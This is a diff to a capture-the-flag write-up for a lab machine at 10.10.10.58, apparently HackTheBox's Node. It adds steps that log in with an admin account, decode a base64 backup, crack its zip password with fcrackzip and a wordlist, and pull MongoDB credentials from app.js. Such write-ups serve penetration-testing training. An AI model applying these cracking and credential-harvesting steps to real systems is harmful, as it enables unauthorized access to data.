@@ -122,6 +122,50 @@ mark:snowflake
 myP14ceAdm1nAcc0uNT:manchester
 ```
 
++ Visit `http://10.10.10.58:3000/login` and login with the admin's account `myP14ceAdm1nAcc0uNT`:`manchester`
++ Download Backup file.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d89bea42-0470-4e1f-8e12-35246d747736)
+
++ File type: `file myplace.backup`
++ View only the last 100 bytes of data from **myplace.backup**: `tail -c 100 myplace.backup`
++ It is base64 encoding.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/06207dcb-8b7a-4d85-a3fe-c857022a6c4e)
+
++ Decode it: `base64 -d myplace.backup > decoded.file`
++ File type: `file decoded.file`
++ Extract zip file: `unzip decoded.file`
++ It requires a password.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/09a27b2a-3c5b-4c57-9f8d-eb142218df6a)
+
++ Crack it using fcrackzip: `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.file`
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.file
+
+PASSWORD FOUND!!!!: pw == magicword
+
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff73b8cb-fc1c-4f88-8ea4-cdf00c831664)
+
++ Unzip the file with the password: `unzip -P magicword decoded.file`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c709399b-ccce-47c1-ab28-cbd87c169155)
+
++ Discovered **mongodb** credentials in the **app.js** file:
+```
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ad6fec3-13ff-4dbd-bd8d-29f5c298cbd3)
+
+
+
+
 
 
 # References & Alternatives:
